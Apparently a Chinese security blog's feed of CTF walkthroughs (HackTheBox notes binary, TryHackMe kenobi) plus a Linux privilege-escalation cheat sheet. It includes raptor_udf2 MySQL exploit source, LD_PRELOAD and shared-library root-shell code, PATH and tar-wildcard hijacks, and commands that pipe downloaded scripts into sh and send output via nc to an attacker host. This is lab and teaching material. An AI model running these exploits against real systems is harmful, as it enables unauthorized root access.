Show user information3) Delete an user4) Write a note5) Show a note6) Save a note (not yet implemented)7) Delete a note8) Backup notes9) Quit========================================Your choice:\n\n看起来像是一个写笔记的程序，测试了一下发现确实是差不多的。\n那我们把程序丢进ida逆向下看看其大体流程。\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char *v3; // rax  int v5; // [rsp+Ch] [rbp-14h] BYREF  void *ptr; // [rsp+10h] [rbp-10h]  void *s; // [rsp+18h] [rbp-8h]  v5 = 0;  s = 0LL;  ptr = 0LL;  while ( 1 )  &#123;    puts(      &quot;========================================\\n&quot;      &quot;1) Create an user and choose an username\\n&quot;      &quot;2) Show user information\\n&quot;      &quot;3) Delete an user\\n&quot;      &quot;4) Write a note\\n&quot;      &quot;5) Show a note\\n&quot;      &quot;6) Save a note (not yet implemented)\\n&quot;      &quot;7) Delete a note\\n&quot;      &quot;8) Backup notes\\n&quot;      &quot;9) Quit\\n&quot;      &quot;========================================\\n&quot;      &quot;\\n&quot;);    printf(&quot;Your choice: &quot;);    __isoc99_scanf(&quot;%d&quot;, &amp;v5);    puts(&amp;byte_212E);    switch ( v5 )    &#123;      case 1:        s = malloc(0x28uLL);        if ( !s )          exit(-1);        memset(s, 0, 0x18uLL);        memset((char *)s + 24, 0, 0x10uLL);        if ( getuid() )        &#123;          *((_DWORD *)s + 6) = &#x27;resu&#x27;;        &#125;        else        &#123;          v3 = (char *)s + 24;          *((_DWORD *)s + 6) = &#x27;imda&#x27;;          v3[4] = &#x27;n&#x27;;        &#125;        printf(&quot;Choose an username: &quot;);        __isoc99_scanf(&quot;%23s&quot;, s);        puts(&amp;byte_212E);        continue;      case 2:        if ( !s )          goto LABEL_11;        printf(&quot;\\nUsername: %s\\n&quot;, (const char *)s);        printf(&quot;Role: %s\\n\\n&quot;, (const char *)s + 24);        break;      case 3:        if ( s )          free(s);        continue;      case 4:        ptr = malloc(0x28uLL);        memset(ptr, 0, 0x28uLL);        if ( !ptr )          exit(-1);        puts(&quot;Write your note:&quot;);        __isoc99_scanf(&quot;%39s&quot;, ptr);        continue;      case 5:        printf(&quot;Note: %s\\n\\n&quot;, (const char *)ptr);        continue;      case 6:        puts(&quot;Coming soon!\\n&quot;);        continue;      case 7:        if ( ptr )        &#123;          free(ptr);          ptr = 0LL;        &#125;        continue;      case 8:        if ( s )        &#123;          if ( !strcmp((const char *)s + 24, &quot;admin&quot;) )          &#123;            puts(&quot;Access granted!&quot;);            setuid(0);            setgid(0);            system(&quot;tar -czvf /root/backups/backup_notes.tar.gz /opt/notes&quot;);          &#125;          else          &#123;            puts(&quot;Access denied: you don&#x27;t have the admin role!\\n&quot;);          &#125;        &#125;        else        &#123;LABEL_11:          puts(&quot;First create an user!\\n&quot;);        &#125;        break;      default:        exit(0);    &#125;  &#125;&#125;\n\n我们首先可以看到case 8里面有用root权限执行一条命令，那我们馋哭了，多么希望能绕过前面的用户身份验证。\n再仔细分析一下，我们会发现case3删除用户处，只释放了空间，并没有将指针赋零，如果我们仔细看case7删除笔记功能就会发现，正确的流程是free之后要将指针赋零，不然会导致问题。我们听听麦克阿瑟chatgpt怎么说：\n\n很明显，这样会存在野指针的问题。我们该如何利用呢？\n我们看到case1创建用户时开辟的空间是0x28的40字节的空间s，case8检查用户身份的时候，检测的是s的第24位开始是否是admin。case 4分配同样分配的是40字节的空间，因为指针没置0所以很可能分到刚才的地址s。\n结合以上的分析，我们可以这样利用：\n1.创建任意用户–&gt;2.删除用户，造成野指针–&gt;3.写笔记，前24位用户名随便填写，然后填上admin作为用户身份–&gt;4.运行8，此时可以通过用户身份验证。\n然后接下来tar -czvf /root/backups/backup_notes.tar.gz /opt/notes这一条就好弄了，tar没用绝对地址，用的相对地址，那我们在PATH里面加上我们构造的tar就完事了，然后执行8就会以root权限执行我们的命令。\ntbuckley@gofer:/usr/local/bin$ ./notes========================================1) Create an user and choose an username2) Show user information3) Delete an user4) Write a note5) Show a note6) Save a note (not yet implemented)7) Delete a note8) Backup notes9) Quit========================================Your choice: 1Choose an username: whatever========================================1) Create an user and choose an username2) Show user information3) Delete an user4) Write a note5) Show a note6) Save a note (not yet implemented)7) Delete a note8) Backup notes9) Quit========================================Your choice: 3========================================1) Create an user and choose an username2) Show user information3) Delete an user4) Write a note5) Show a note6) Save a note (not yet implemented)7) Delete a note8) Backup notes9) Quit========================================Your choice: 4Write your note:xxxxxxxxxxxxxxxxxxxxxxxxadmin========================================1) Create an user and choose an username2) Show user information3) Delete an user4) Write a note5) Show a note6) Save a note (not yet implemented)7) Delete a note8) Backup notes9) Quit========================================Your choice: 2Username: xxxxxxxxxxxxxxxxxxxxxxxxadminRole: admin\n\n正如我们所想，完美。\n再构造一下tar。\ntbuckley@gofer:/tmp$ echo &#x27;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#x27; &gt; tartbuckley@gofer:/tmp$ chmod +x tartbuckley@gofer:/tmp$ ls -latotal 60drwxrwxrwt 14 root     root     4096 Aug  5 15:49 .drwxr-xr-x 18 root     root     4096 Jul 19 12:44 ..drwxrwxrwt  2 root     root     4096 Aug  5 08:05 .font-unixdrwxr-xr-x  2 jhudson  jhudson  4096 Aug  5 14:36 hsperfdata_jhudsondrwxrwxrwt  2 root     root     4096 Aug  5 08:05 .ICE-unixdrwx------  3 jhudson  jhudson  4096 Aug  5 11:02 lu5012xuigb9.tmpdrwx------  2 jhudson  jhudson  4096 Aug  5 14:36 lu9624y25uma.tmpsrwxr-xr-x  1 jhudson  jhudson     0 Aug  5 14:36 OSL_PIPE_1000_SingleOfficeIPC_b31bb423faa33322afe433cf9acd1272drwx------  3 root     root     4096 Aug  5 08:05 systemd-private-711ebd4724b24c22b4a90210e66cc476-apache2.service-1K3kihdrwx------  3 root     root     4096 Aug  5 08:05 systemd-private-711ebd4724b24c22b4a90210e66cc476-systemd-logind.service-FsKf3fdrwx------  3 root     root     4096 Aug  5 08:05 systemd-private-711ebd4724b24c22b4a90210e66cc476-systemd-timesyncd.service-0MAATi-rwxr-xr-x  1 tbuckley tbuckley   52 Aug  5 15:49 tardrwxrwxrwt  2 root     root     4096 Aug  5 08:05 .Test-unixdrwx------  2 root     root     4096 Aug  5 08:05 vmware-root_617-4022243191drwxrwxrwt  2 root     root     4096 Aug  5 08:05 .X11-unixdrwxrwxrwt  2 root     root     4096 Aug  5 08:05 .XIM-unix\n\n再设置一下PATH，在重新执行一下notes\n========================================1) Create an user and choose an username2) Show user information3) Delete an user4) Write a note5) Show a note6) Save a note (not yet implemented)7) Delete a note8) Backup notes9) Quit========================================Your choice: 8Access granted!\n\n查看一下tmp目录。\ntbuckley@gofer:/tmp$ ls -latotal 1268drwxrwxrwt 14 root     root        4096 Aug  5 15:51 .drwxr-xr-x 18 root     root        4096 Jul 19 12:44 ..drwxrwxrwt  2 root     root        4096 Aug  5 08:05 .font-unixdrwxr-xr-x  2 jhudson  jhudson     4096 Aug  5 14:36 hsperfdata_jhudsondrwxrwxrwt  2 root     root        4096 Aug  5 08:05 .ICE-unixdrwx------  3 jhudson  jhudson     4096 Aug  5 11:02 lu5012xuigb9.tmpdrwx------  2 jhudson  jhudson     4096 Aug  5 14:36 lu9624y25uma.tmpsrwxr-xr-x  1 jhudson  jhudson        0 Aug  5 14:36 OSL_PIPE_1000_SingleOfficeIPC_b31bb423faa33322afe433cf9acd1272-rwsr-sr-x  1 root     root     1234376 Aug  5 15:51 rootbashdrwx------  3 root     root        4096 Aug  5 08:05 systemd-private-711ebd4724b24c22b4a90210e66cc476-apache2.service-1K3kihdrwx------  3 root     root        4096 Aug  5 08:05 systemd-private-711ebd4724b24c22b4a90210e66cc476-systemd-logind.service-FsKf3fdrwx------  3 root     root        4096 Aug  5 08:05 systemd-private-711ebd4724b24c22b4a90210e66cc476-systemd-timesyncd.service-0MAATi-rwxr-xr-x  1 tbuckley tbuckley      52 Aug  5 15:49 tardrwxrwxrwt  2 root     root        4096 Aug  5 08:05 .Test-unixdrwx------  2 root     root        4096 Aug  5 08:05 vmware-root_617-4022243191drwxrwxrwt  2 root     root        4096 Aug  5 08:05 .X11-unixdrwxrwxrwt  2 root     root        4096 Aug  5 08:05 .XIM-unixtbuckley@gofer:/tmp$ ./rootbash -prootbash-5.1# iduid=1002(tbuckley) gid=1002(tbuckley) euid=0(root) egid=0(root) groups=0(root),1002(tbuckley),1004(dev)rootbash-5.1# whoamirootrootbash-5.1# cd /rootrootbash-5.1# ls -latotal 80drwx------ 14 root root 4096 Jul 17 16:55 .drwxr-xr-x 18 root root 4096 Jul 19 12:44 ..drwxr-xr-x  2 root root 4096 Apr 28 12:19 backupslrwxrwxrwx  1 root root    9 Nov  3  2022 .bash_history -&gt; /dev/null-rw-r--r--  1 root root  571 Apr 10  2021 .bashrcdrwx------  3 root root 4096 Apr 26 23:59 .configdrwxr-xr-x  2 root root 4096 Apr 26 23:59 Desktopdrwxr-xr-x  2 root root 4096 Apr 26 23:59 Documentsdrwxr-xr-x  2 root root 4096 Apr 26 23:59 Downloadsdrwxr-xr-x  3 root root 4096 Oct 28  2022 .localdrwxr-xr-x  2 root root 4096 Apr 26 23:59 Musicdrwxr-xr-x  2 root root 4096 Apr 26 23:59 Pictures-rw-r--r--  1 root root  161 Jul  9  2019 .profiledrwxr-xr-x  2 root root 4096 Apr 26 23:59 Public-rw-r-----  1 root root   33 Aug  5 08:05 root.txtdrwxr-xr-x  2 root root 4096 Jul 27 11:57 scriptsdrwxr-xr-x  2 root root 4096 Apr 26 23:59 Templatesdrwxr-xr-x  2 root root 4096 Apr 26 23:59 Videos-rw-r--r--  1 root root   39 Jul 17 16:55 .vimrc-rw-------  1 root root   54 Apr 26 23:59 .Xauthority-rw-------  1 root root 1626 Apr 27 00:16 .xsession-errors\n\n搞定。\n","categories":["HackTheBox"],"tags":["walkthrough"]},{"title":"[THM]  kenobi","url":"/2023/05/24/kenobi/","content":"\n\n\n信息收集\nnmap -sC -sV -T4 ip\n┌──(root㉿kali)-[~]└─# nmap -sC -sV -T4 10.10.87.203Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 11:36 UTCNmap scan report for ip-10-10-87-203.eu-west-1.compute.internal (10.10.87.203)Host is up (0.0029s latency).Not shown: 993 closed tcp ports (reset)PORT     STATE SERVICE     VERSION21/tcp   open  ftp         ProFTPD 1.3.522/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 b3ad834149e95d168d3b0f057be2c0ae (RSA)|   256 f8277d642997e6f865546522f7c81d8a (ECDSA)|_  256 5a06edebb6567e4c01ddeabcbafa3379 (ED25519)80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)| http-robots.txt: 1 disallowed entry |_/admin.html|_http-title: Site doesnt have a title (text/html).111/tcp  open  rpcbind     2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100003  2,3,4       2049/tcp   nfs|   100003  2,3,4       2049/tcp6  nfs|   100003  2,3,4       2049/udp   nfs|   100003  2,3,4       2049/udp6  nfs|   100005  1,2,3      39028/udp   mountd|   100005  1,2,3      51006/udp6  mountd|   100005  1,2,3      52219/tcp   mountd|   100005  1,2,3      53459/tcp6  mountd|   100021  1,3,4      34773/tcp6  nlockmgr|   100021  1,3,4      37630/udp6  nlockmgr|   100021  1,3,4      39473/tcp   nlockmgr|   100021  1,3,4      41668/udp   nlockmgr|   100227  2,3         2049/tcp   nfs_acl|   100227  2,3         2049/tcp6  nfs_acl|   100227  2,3         2049/udp   nfs_acl|_  100227  2,3         2049/udp6  nfs_acl139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)2049/tcp open  nfs_acl     2-3 (RPC #100227)MAC Address: 02:52:93:89:63:6F (Unknown)Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s| smb2-security-mode: |   311: |_    Message signing enabled but not required| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-time: |   date: 2023-04-10T11:36:30|_  start_date: N/A|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)|   Computer name: kenobi|   NetBIOS computer name: KENOBI\\x00|   Domain name: \\x00|   FQDN: kenobi|_  System time: 2023-04-10T06:36:30-05:00Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.48 seconds\n\n\n21端口，ftp服务开放，且使用的是ProFTPD，version是1.3.5。\n\n80端口开放，有网页服务器，访问网页没有任何有用信息。admin.html屁用没有（\n\n111端口开放，rpc服务开启。\n\n139和445端口开放，Samba服务开启。\n\nSamba是适用于Linux和Unix的标准Windows互操作性程序套件。它允许最终用户访问和使用公司内部网或互联网上的文件、打印机和其他常见共享资源。它通常被称为网络文件系统。Samba基于服务器消息块（SMB）的通用客户端/服务器协议。SMB仅针对Windows开发，如果没有Samba，其他计算机平台将与Windows机器隔离，即使它们是同一网络的一部分。\n\n\n因为上面扫描发现存在smb服务，所以使用nmap脚本smb-enum-shares.nse以及smb-enum-users.nse对靶机smb的shares以及users进行列举。\n​\t\t\n可以发现\\IPC$以及\\anonymous都可以任意读写以及访问。\n\n所以，我们使用smbclient //ip/anonymous匿名连接靶机smb共享，查看发现存在log.txt文件。（&#x2F;&#x2F;ip&#x2F;IPC$啥也没有）\n​\t\n我们从log.txt中，我们可以发现用户生成了自己的ssh私钥放在/home/kenobi/.ssh/目录下的id_rsa文件中。于是我们考虑能否拿到该秘钥以通过ssh登录靶机。\n\n于是，我们得想办法拿到秘钥。之前扫描发现的111端口开放且正在运行rpcbind服务，rpcbind是一个将远程程序调用(RPC– remote procedure call)的程序号转换为通用地址的服务器。当一个RPC 服务启动时，它会告诉 rpcbind 它正在监听的地址以及它准备启用的服务所对应的RPC程序编号。因为扫描发现nfs（network file system）服务被远程启用，我们进一步使用nmap脚本nfs-ls, nfs-statfs, nfs-showmount尝试枚举nfs信息。\n\n我们可以发现，靶机将&#x2F;var挂载在nfs上。我们可以尝试将这个目录挂载在我们的攻击机上。\n\n\n漏洞利用\n但是我们想要的秘钥不在&#x2F;var目录下，我们首先要将其弄到&#x2F;var目录中。前面发现了ProFTPD的版本是1.3.5，我们searchsploit proFTPD 1.3.5 发现其存在文件拷贝漏洞。（其他两个’mod_copy’ RCE利用不成功）。查看File Copy的漏洞利用.txt文件，发现漏洞细节。\n\n该版本ProFtpd的mod_copy模块中存在漏洞。mod_copy模块实现了SITE CPFR 和 SITE CPTO 命令(类似于 RNFR 和 RNTO) ，这些命令可以用来将文件&#x2F;目录从服务器上的一个地方复制到另一个地方，而无需将数据传输到客户端并等待返回（无身份验证），该模块包含在 ProFTPD 1.3.x 的 mod_copy.c 文件中，默认情况下不进行编译。也就是说：任何未经身份验证的客户机都可以利用SITE CPFR 和 SITE CPTO 命令，将文件从FTP服务器的文件系统的任何位置复制到选定的位置。刚好是我们需要的功能。\n\n我们使用nc连接ftp服务器，并利用该漏洞将id_rsa拷贝到&#x2F;var&#x2F;tmp目录下。\nnc -nv 10.10.87.203 21SITE CPFR /home/kenobi/.ssh/id_rsaSITE CPTO /vat/tmp/id_rsa\n\n我们将&#x2F;var挂载(mount)到我们机子上\n​\t\n可以发现，我们已经获得了ssh登录的rsa私钥。\n\n我们将id_rsa文件权限改成600，否则无法用于ssh登录。\n\n成功登录并可以看到user.txt。\n\n\n提权\n先把lse.sh传上去再说。运行。（或者使用find / -perm -u=s -type f 2&gt;/dev/null查找有SUID位的二进制文件）\n\n发现有趣的setuid二进制文件：&#x2F;usr&#x2F;bin&#x2F;menu。\n\n我们用string检查一下这个二进制文件。（strings 是 Linux 上的一个命令，它能在二进制文件上查找人类可读的字符串，我们使用以下命令来查看&#x2F;usr&#x2F;bin&#x2F;menu运行时的信息（因为执行menu命令时有文字回显，我们才使用strings命令））\n\n我们发现，其调用curl,uname,ifconfig使用的不是绝对路径（/usr/bin/curl）这种。所以系统在执行时会从$PATH下的路径从前到后寻找这些二进制文件。\n\n所以我们可以在$PATH最前面加入目录，并放入我们构造的这些二进制文件，然后menu运行时就会以root权限执行这些文件。因此我们直接构造/bin/bash。\n# 在/home/kenobi目录下kenobi@kenobi:~$ echo /bin/bash &gt; ifconfigkenobi@kenobi:~$ chmod 777 ifconfig\n\n​\t\n成功提权。\n\n\n","categories":["TryHackMe"],"tags":["walkthrough"]},{"title":"Privilege Escalation","url":"/2023/05/24/penetration_note/","content":"\n\n\nPrivilege Escalation整理自B站up红队笔记的提权精讲\nLinux Priv Esca最常用：\n\nugo\nsuid sgid\nCapabilities\nAppArmor Selinux\nACL\n\n用的也比较多的：\n\nGrsecurity\n\nPax\n\nExecShield\n\nASLR\n\nTOMOYO Linux\n\nSMACK\n\nYama\n\nCGroups\n\nLinux Namespaces\n\nStackGuard\n\nProplice\n\nseccomp\n\nPtrace\n\ncapsicum\n\nMprotect\n\nchroot\n\nfirejail\n\n\n手动枚举用户信息：\n\nwhoami\nid\nw&#x2F;who 查看其他登录用户\nlast 最近登录用户以及一些操作\n\n内核版本信息：\n\nuname -a\nlsb_release -a 更多信息\ncat &#x2F;proc&#x2F;version 进程信息查看版本\ncat &#x2F;etc&#x2F;issue\nhostnamectl\n\n网络信息：\n\nip a\nifconfig 老机子\nip route 查看路由表信息\nip neigh 查看网络邻居\narp -a\n\n用户权限：\n\nsudo -l\n\ngetcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null\n\nhistory 查看历史命令\n\ncat &#x2F;etc&#x2F;passwd\n\ncat cat &#x2F;etc&#x2F;shadow\n\ncat &#x2F;etc&#x2F;crontab\n\necho $PATH\n\nenv 查看整体环境\n\nps -ef  entire full list\n\nps axjf  x-没有连接到终端的进程 j-查看进程树 a-all\n\nps aux u-显示启动进程的用户\n\ntop 查看实时更新的进程信息 top -n 1 只刷一次\n\nnetstat -a \n\nnetstat -l 显示正在监听的\n\nfind &#x2F; -type f -perm -04000 2&gt;&#x2F;dev&#x2F;null  或者（find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null）\n\n查找可写文件:\nfind / -writable -type f ! -path &#x27;/proc/*&#x27; 2&gt;/dev/null# !-取反 /proc下的可写文件一般价值不大且多，我们忽略掉\n\n\nwhich 查询可执行文件\n\ncat &#x2F;etc&#x2F;fstab 查看未挂载磁盘（系统运维备份常临时挂载一块磁盘，当使用时再挂载，不使用时就卸掉）\n\n\n自动枚举\n大招：linpeas \n\n推荐：curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh  通过管道符执行，不保留文件到本地。\n将扫描结果传回本地查看 curl &lt;serverIP&gt;/linpeas.sh | sh | nc &lt;kaliIP&gt; &lt;port&gt;  kali: nc -lvnp &lt;port&gt; | tee name.txt tee 既又在标准输出中显示，又保存到txt文件中。txt文件可以用less -r 查看。\n靶机没有curl。kali：sudo nc -lvnp &lt;port&gt; &lt; linpeas.sh victim:cat &lt; /dev/tcp/&lt;kaliIP&gt;/&lt;port&gt; | sh \n\n\nlinEnum\n\nLSE\n\nLES\n\nlinuxprivchecker.py\n\nunix-privsec-check\n\n\nTrickshell的稳定python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;stty raw -echo #raw 格式输出并关闭echo导致的命令显示两次export TERM=xterm-color\n\nrlwrap nc -lvnp 443用readlinewrap将我们的反弹shell包裹起来，防止上下翻历史记录时出现问题。\n常用方法bash version\nver&lt;4.2存在漏洞可以利用：可以在bash中定义函数并用路径组合做文件名。\nver&lt;4.4存在漏洞可以利用：环境变量插入。\n\nMySQL udfMySQL user defined function.\n提权条件\n有mysql账号，且有增删改查权限。最好有mysql root账号。\n\nsecure_file_priv 最好要为空，或者其指定目录能够利用。（该属性限定Load data、select into outfile、load_file()等操作）。（通过show variables like &#39;%secure_file_priv%&#39;查看）\n\n\n利用主要操作：写入’plugin’中。（show variables like &#39;%plugin%&#39;查到的目录）\n其他步骤在exp中有。\n/* * $Id: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $ * * raptor_udf2.c - dynamic library for do_system() MySQL UDF * Copyright (c) 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt; * * This is an helper dynamic library for local privilege escalation through * MySQL run with root privileges (very bad idea!), slightly modified to work  * with newer versions of the open-source database. Tested on MySQL 4.1.14. * * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c * * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes * for the security vulnerabilities in the handling of User Defined Functions * (UDFs) reported by Stefano Di Paola &lt;stefano.dipaola@wisec.it&gt;. For further * details, please refer to: * * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html * http://www.wisec.it/vulns.php?page=4 * http://www.wisec.it/vulns.php?page=5 * http://www.wisec.it/vulns.php?page=6 * * &quot;UDFs should have at least one symbol defined in addition to the xxx symbol  * that corresponds to the main xxx() function. These auxiliary symbols  * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and  * xxx_add() functions&quot;. -- User Defined Functions Security Precautions  * * Usage: * $ id * uid=500(raptor) gid=500(raptor) groups=500(raptor) * $ gcc -g -c raptor_udf2.c * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc * $ mysql -u root -p * Enter password: * [...] * mysql&gt; use mysql; * mysql&gt; create table foo(line blob); * mysql&gt; insert into foo values(load_file(&#x27;/home/raptor/raptor_udf2.so&#x27;)); * mysql&gt; select * from foo into dumpfile &#x27;/usr/lib/raptor_udf2.so&#x27;; * mysql&gt; create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;; * mysql&gt; select * from mysql.func; * +-----------+-----+----------------+----------+ * | name      | ret | dl             | type     | * +-----------+-----+----------------+----------+ * | do_system |   2 | raptor_udf2.so | function | * +-----------+-----+----------------+----------+ * mysql&gt; select do_system(&#x27;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#x27;); * mysql&gt; \\! sh * sh-2.05b$ cat /tmp/out * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm) * [...] * * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys * */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;enum Item_result &#123;STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT&#125;;typedef struct st_udf_args &#123;\tunsigned int\t\targ_count;\t// number of arguments\tenum Item_result\t*arg_type;\t// pointer to item_result\tchar \t\t\t**args;\t\t// pointer to arguments\tunsigned long\t\t*lengths;\t// length of string args\tchar\t\t\t*maybe_null;\t// 1 for maybe_null args&#125; UDF_ARGS;typedef struct st_udf_init &#123;\tchar\t\t\tmaybe_null;\t// 1 if func can return NULL\tunsigned int\t\tdecimals;\t// for real functions\tunsigned long \t\tmax_length;\t// for string functions\tchar\t\t\t*ptr;\t\t// free ptr for func data\tchar\t\t\tconst_item;\t// 0 if result is constant&#125; UDF_INIT;int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)&#123;\tif (args-&gt;arg_count != 1)\t\treturn(0);\tsystem(args-&gt;args[0]);\treturn(0);&#125;char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)&#123;\treturn(0);&#125;// milw0rm.com [2006-02-20]\n\n&#x2F;etc&#x2F;shadow什么时候用：手动枚举发现可读写，历史命令发现当前账号进行过操作。\n\n可读：用john破解\n可写：直接写入(使用mkpasswd -m sha-512 生成对应格式的hash值填入)\n\n&#x2F;etc&#x2F;passwd可写：openssl passwd &lt;passwd&gt;\nsudo 环境变量提权sudo -l发现存在环境变量env_keep+=LD_PRELOADS(LD&#x3D;link dynamic动态链接库)\n/* shell.c /* /* -fPIC place indepedent code/* 还需要以root权限执行一个命令（随便）随后就能在命令执行前预先执行动态链接库生成新/* 的root bash实现提权/* gcc -fPIC -shared -o shell.so shell.c -nostartfiles/* sudo LD_PRELOAD=/tmp/shell.so &lt;rootcommand&gt;*/#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt; //数据类型库#include &lt;stdlib.h&gt;void_init()&#123;    unsetenv(&quot;LD_PRELOAD&quot;); //执行一次就卸掉链接库    setgid(0);    setuid(0);    system(&quot;/bin/bash&quot;);    &#125;\n\n自动任务\n自动任务文件可写\ncat /etc/crontab\nls -la /etc | grep cron*\n\n环境变量路径可写且自动任务相对路径\n可写入crontab中$PATH变量中较前的路径。\n如果自动任务不是绝对路径，我们可以在较前的路径构造同名文件，实现劫持自动任务执行提权。\n#!/bin/bashcp /bin/bash /tmp/rootbashchmod +xs /tmp/rootbash\n\n自动任务通配符提权\n如果存在使用tar &lt;target&gt; *自动打包的自动任务\n我们可以通过--checkpoint-action利用\ntouch &lt;tar target&gt;/--checkpoint=1touch &lt;tar target&gt;/--checkpoint-action=exec=shell.elf\n\nSUIDfind / -type f -perm -u=s -ls 2&gt;/dev/null\n发现不常见的suid文件，我们可以使用strings查看其中字符串，strace以便后面利用。\n可执行文件直接gtfobins\n共享库注入提权so文件\n使用strings查看suid文件中可识别字符串发现使用到了so库文件\n使用strace追踪，使用2&gt;&amp;1将错误信息重定向到标准输出\n看他需要什么共享库，我们给他写一个\n/* lib.c /* gcc -fPIC -shared -o lib.so lib.c*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;static void inject() __attribute__((constructor));void inject()&#123;    setgid(0);    setuid(0);    system(&quot;/bin/bash -p&quot;);    &#125;\n\n环境变量利用用strings查看suid文件时时发现其中使用相对路径而非绝对路径。\n直接起一个一样的名字给他劫持掉。\n/* sameName.c /* gcc -o sameName sameName.c/* export PATH=.:$PATH*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void main()&#123;    setgid(0);    setuid(0);    system(&quot;/bin/bash -p&quot;);    &#125;\n\nSUID-shell 功能提权\nbash --version小于4.2\nfunction /usr/sbin/service &#123; /bin/bash -p; &#125;export -f /usr/sbin/service //导出函数以劫持// 此处执行suid文件\n\nbash --version小于4.4\n# env 设置环境变量# -i 忽略现有的环境变量 # SHELLOPTS=xtrace用于命令执行前将其打印并插入其他语句# PS4 指定提示符env -i SHELLOPTS=xtrace PS4=&#x27;$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)&#x27; &lt;any file set suid&gt;\n\n密码和密钥历史\n用history查看历史记录中是否遗留着密码\ncat ~/.*history | less用less列出当前用户家目录下所有与history相关的文件\n如果viminfo可以查看， 里面可能存在编辑时留下的密钥信息\n查看各种vpn配置文件(.ovpn)，网页配置文件(wp-config.php)等\n根目录下.ssh文件夹中可能存在私钥\n\nNFS提权NFS &#x3D; Network File System 常用于网络上文件共享。NFS即可用于获取初步立足点，也可用于提权。信息收集时要注意（一般绑在RPC端口上）。\n\ncat /etc/exports 查看NFS具体配置。如果有no_root_squash选项，很可能可以用于提权。\n\n在攻击机上挂载一下\nmkdir /tmp/nfsmount -o rw,vers=3 &lt;nfsip:/tmp&gt; /tmp/nfs #&lt;nfsip:/tmp&gt;在配置文件中得来cd /tmp/nfs su# 以root身份向其中插入我们的reverse shellmsfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf\n\n在靶机中执行即可\n\n\n内核提权必须提一嘴，内核提权不太稳定，很容易搞崩机子，使用前要三思。此外，内核提权和抽奖挺像，要有耐心，选择有效的exp最关键。没有注释的exp慎用。\ndirtyCow不是很稳定。\nLinux Kernal 2.6有一个著名的内核提权漏洞UDEV。\ndoas less + vi提权\nfind / -perm -u=s -type f 2&gt;/dev/null\n在openBSD等一部分系统中，会用到doas作为特权操作，如果当前用户有操作doas的权限，可以考虑提权。\ncat /etc/doas.conf 查看不需要密码执行的doas操作。\n如果可以使用less，那我们在less中可以按v进入vi编辑模式以root权限进行文件操作。\n在vi模式中:!sh可以起一个新的shell，doas root则是root shell。\n\n利用MOTD机制提权 motd &#x3D; message of the day\n\ncd /etc/update-motd.d/ ; ls -la\ncat /etc/00-header\n如果可编辑则写入反弹shell或者其他提权语句都可。\n\n可预测PRNG暴力破解SSH提权prng &#x3D; pseudo random number generator\n如果拿到了ssh公钥，可以考虑使用伪随机数生成器暴力碰撞破解。\n可以在searchsploit中查找prng但是要注意openssl版本。\n下载下来公私钥库后 直接选择拿到公钥的一部分 grep -lr 递归列举文件搜索，找到对应的公私钥对。\n","categories":["Pentest"],"tags":["pe_notes"]},{"title":"[HTB]  sau","url":"/2023/07/15/sau/","content":"\n\n\n前言这台靶机是当前赛季最新靶机。比较考察对基本漏洞原理与利用的理解。\n信息收集nmap┌──(kali㉿kali)-[~/HTB/sau]└─$ sudo nmap -p- --min-rate=10000 10.10.11.224 [sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 21:19 CSTWarning: 10.10.11.224 giving up on port because retransmission cap hit (10).Nmap scan report for 10.10.11.224Host is up (0.27s latency).Not shown: 65531 closed tcp ports (reset)PORT      STATE    SERVICE22/tcp    open     ssh80/tcp    filtered http8338/tcp  filtered unknown55555/tcp open     unknownNmap done: 1 IP address (1 host up) scanned in 14.17 seconds                                                                                             ┌──(kali㉿kali)-[~/HTB/sau]└─$ sudo nmap -sV 